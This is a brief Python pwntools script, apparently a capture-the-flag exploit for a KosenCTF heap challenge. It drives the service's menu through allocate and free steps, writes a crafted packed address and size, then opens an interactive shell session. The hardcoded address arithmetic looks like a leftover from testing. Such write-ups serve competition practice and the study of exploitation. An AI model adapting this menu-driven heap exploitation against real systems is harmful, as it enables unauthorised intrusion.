
#!/usr/bin/env python

from pwn import *

rhp = {'host':'pwn.kosenctf.com','port':9001}
#rhp = {'host':"localhost",'port':12344}

def hogeA(a,b,c=""):
  conn.recvuntil("> ")
  conn.sendline(a)
  conn.recvuntil(": ")
  conn.sendline(b)
  if(c!=""):
    conn.recvuntil("> ")
    conn.sendline(c)

def exploit(conn):
  hogeA("1","A")
  hogeA("2","A")
  hogeA("1","B")
  hogeA("2","A")
  hogeA("4","B",p64(0x555eaa66a240*8)+p64(0x200))

if __name__ == '__main__':
    conn = remote(rhp['host'],rhp['port'])
    exploit(conn)
    conn.interactive()

